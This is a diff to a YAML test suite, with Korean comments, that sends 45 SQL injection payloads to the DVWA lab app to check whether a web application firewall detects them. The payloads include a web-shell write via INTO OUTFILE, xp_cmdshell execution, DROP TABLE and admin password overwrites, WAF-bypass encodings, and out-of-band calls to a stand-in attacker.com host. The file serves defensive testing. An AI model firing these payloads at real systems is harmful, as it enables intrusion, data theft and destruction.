@@ -2,12 +2,12 @@
 # SQL Injection (SQLi) Test Cases
 # =============================================================================
 # DVWA의 SQL Injection 취약점을 통해 WAF 탐지 능력을 검증합니다.
-# 대표적인 SQL Injection 페이로드를 전송하여 WAF가 차단/탐지하는지 확인합니다.
+# 기본 SQLi, Blind, Error-based, 고급 우회 기법, NoSQL 포함 45케이스
 # =============================================================================
 
 category: "sqli"
 name: "SQL Injection"
-description: "SQL Injection 공격 탐지 테스트"
+description: "SQL Injection 공격 탐지 테스트 (확장판 45케이스)"
 severity: "critical"
 icon: "🗃️"
 
@@ -196,3 +196,238 @@ tests:
       id: "1 UNION SELECT '<?php system($_GET[\"cmd\"]); ?>', null INTO OUTFILE '/var/www/shell.php'-- "
       Submit: "Submit"
     severity: "critical"
+
+  # ======== [신규 확장: +25 케이스] ========
+
+  # --- PostgreSQL 특화 ---
+  - id: "sqli-021"
+    description: "SQLi PostgreSQL - pg_sleep 시간기반"
+    method: "GET"
+    path: "/vulnerabilities/sqli/"
+    params:
+      id: "1; SELECT pg_sleep(5)-- "
+      Submit: "Submit"
+    severity: "high"
+
+  - id: "sqli-022"
+    description: "SQLi PostgreSQL - CAST 에러 기반"
+    method: "GET"
+    path: "/vulnerabilities/sqli/"
+    params:
+      id: "1 AND CAST((SELECT version()) AS int)-- "
+      Submit: "Submit"
+    severity: "high"
+
+  - id: "sqli-023"
+    description: "SQLi PostgreSQL - dblink 원격 쿼리"
+    method: "GET"
+    path: "/vulnerabilities/sqli/"
+    params:
+      id: "1; SELECT * FROM dblink('host=attacker.com user=evil dbname=test','SELECT version()') AS t(v text)-- "
+      Submit: "Submit"
+    severity: "critical"
+
+  # --- MSSQL 특화 ---
+  - id: "sqli-024"
+    description: "SQLi MSSQL - WAITFOR DELAY"
+    method: "GET"
+    path: "/vulnerabilities/sqli/"
+    params:
+      id: "1; WAITFOR DELAY '00:00:05'-- "
+      Submit: "Submit"
+    severity: "high"
+
+  - id: "sqli-025"
+    description: "SQLi MSSQL - xp_cmdshell RCE"
+    method: "GET"
+    path: "/vulnerabilities/sqli/"
+    params:
+      id: "1; EXEC xp_cmdshell 'whoami'-- "
+      Submit: "Submit"
+    severity: "critical"
+
+  - id: "sqli-026"
+    description: "SQLi MSSQL - OPENROWSET"
+    method: "GET"
+    path: "/vulnerabilities/sqli/"
+    params:
+      id: "1; SELECT * FROM OPENROWSET('SQLOLEDB','server=attacker.com','trusted','','SELECT 1')-- "
+      Submit: "Submit"
+    severity: "critical"
+
+  # --- Second Order SQLi ---
+  - id: "sqli-027"
+    description: "SQLi Second-Order - 저장 후 실행"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "' UNION SELECT user,password FROM users-- "
+      btnSign: "Sign Guestbook"
+    severity: "critical"
+
+  - id: "sqli-028"
+    description: "SQLi Second-Order - 트리거 실행"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "'; DROP TABLE users; --"
+      btnSign: "Sign Guestbook"
+    severity: "critical"
+
+  # --- WAF 우회 고급 기법 ---
+  - id: "sqli-029"
+    description: "SQLi - 과학적 표기법 우회 1e1"
+    method: "GET"
+    path: "/vulnerabilities/sqli/"
+    params:
+      id: "' OR 1e1=1e1-- "
+      Submit: "Submit"
+    severity: "medium"
+
+  - id: "sqli-030"
+    description: "SQLi - 백슬래시 이스케이프 우회"
+    method: "GET"
+    path: "/vulnerabilities/sqli/"
+    params:
+      id: "\\' OR 1=1-- "
+      Submit: "Submit"
+    severity: "medium"
+
+  - id: "sqli-031"
+    description: "SQLi - 공백 없음 (탭/개행으로 대체)"
+    method: "GET"
+    path: "/vulnerabilities/sqli/"
+    params:
+      id: "'%0aOR%0a1=1-- "
+      Submit: "Submit"
+    severity: "medium"
+
+  - id: "sqli-032"
+    description: "SQLi - CRLF 조작 (%0d%0a)"
+    method: "GET"
+    path: "/vulnerabilities/sqli/"
+    params:
+      id: "'%0d%0aOR%0d%0a1=1-- "
+      Submit: "Submit"
+    severity: "medium"
+
+  - id: "sqli-033"
+    description: "SQLi - 주석 내부 삽입 /**/OR/**/1=1"
+    method: "GET"
+    path: "/vulnerabilities/sqli/"
+    params:
+      id: "'/**/OR/**/1=1#"
+      Submit: "Submit"
+    severity: "medium"
+
+  - id: "sqli-034"
+    description: "SQLi - MySQL # 주석"
+    method: "GET"
+    path: "/vulnerabilities/sqli/"
+    params:
+      id: "admin'#"
+      Submit: "Submit"
+    severity: "high"
+
+  - id: "sqli-035"
+    description: "SQLi - 정보 스키마 전체 덤프"
+    method: "GET"
+    path: "/vulnerabilities/sqli/"
+    params:
+      id: "' UNION SELECT schema_name, null FROM information_schema.schemata-- "
+      Submit: "Submit"
+    severity: "critical"
+
+  - id: "sqli-036"
+    description: "SQLi - GROUP_CONCAT 사용자 덤프"
+    method: "GET"
+    path: "/vulnerabilities/sqli/"
+    params:
+      id: "' UNION SELECT GROUP_CONCAT(user,':',password), null FROM mysql.user-- "
+      Submit: "Submit"
+    severity: "critical"
+
+  # --- Time-based 고급 ---
+  - id: "sqli-037"
+    description: "Blind SQLi - BENCHMARK (MySQL)"
+    method: "GET"
+    path: "/vulnerabilities/sqli_blind/"
+    params:
+      id: "' OR BENCHMARK(5000000,MD5('test'))-- "
+      Submit: "Submit"
+    severity: "high"
+
+  - id: "sqli-038"
+    description: "Blind SQLi - IF + SLEEP 조건부"
+    method: "GET"
+    path: "/vulnerabilities/sqli_blind/"
+    params:
+      id: "' OR IF(ASCII(SUBSTR((SELECT DATABASE()),1,1))>100,SLEEP(3),0)-- "
+      Submit: "Submit"
+    severity: "high"
+
+  - id: "sqli-039"
+    description: "Blind SQLi - CASE WHEN SLEEP"
+    method: "GET"
+    path: "/vulnerabilities/sqli_blind/"
+    params:
+      id: "' OR (SELECT CASE WHEN 1=1 THEN SLEEP(3) ELSE 0 END)-- "
+      Submit: "Submit"
+    severity: "high"
+
+  # --- Stacked Queries ---
+  - id: "sqli-040"
+    description: "SQLi - Stacked INSERT"
+    method: "GET"
+    path: "/vulnerabilities/sqli/"
+    params:
+      id: "1; INSERT INTO users (user,password) VALUES ('hacker','pass')-- "
+      Submit: "Submit"
+    severity: "critical"
+
+  - id: "sqli-041"
+    description: "SQLi - Stacked UPDATE"
+    method: "GET"
+    path: "/vulnerabilities/sqli/"
+    params:
+      id: "1; UPDATE users SET password='hacked' WHERE user='admin'-- "
+      Submit: "Submit"
+    severity: "critical"
+
+  # --- Out-of-Band SQLi ---
+  - id: "sqli-042"
+    description: "SQLi OOB - MySQL LOAD_FILE"
+    method: "GET"
+    path: "/vulnerabilities/sqli/"
+    params:
+      id: "' UNION SELECT LOAD_FILE('\\\\attacker.com\\share\\test'), null-- "
+      Submit: "Submit"
+    severity: "critical"
+
+  - id: "sqli-043"
+    description: "SQLi OOB - MSSQL xp_dirtree"
+    method: "GET"
+    path: "/vulnerabilities/sqli/"
+    params:
+      id: "1; EXEC master..xp_dirtree '\\\\attacker.com\\share'-- "
+      Submit: "Submit"
+    severity: "critical"
+
+  # --- VBS / WAF 우회 ---
+  - id: "sqli-044"
+    description: "SQLi - HTML 엔티티 인코딩 &quot;OR 1=1"
+    method: "GET"
+    path: "/vulnerabilities/sqli/"
+    params:
+      id: "&quot; OR 1=1-- "
+      Submit: "Submit"
+    severity: "medium"
+
+  - id: "sqli-045"
+    description: "SQLi - obfuscation: CHAR() 함수 우회"
+    method: "GET"
+    path: "/vulnerabilities/sqli/"
+    params:
+      id: "' OR 1=1 AND CHAR(65,68,77,73,78)='ADMIN'-- "
+      Submit: "Submit"
+    severity: "medium"
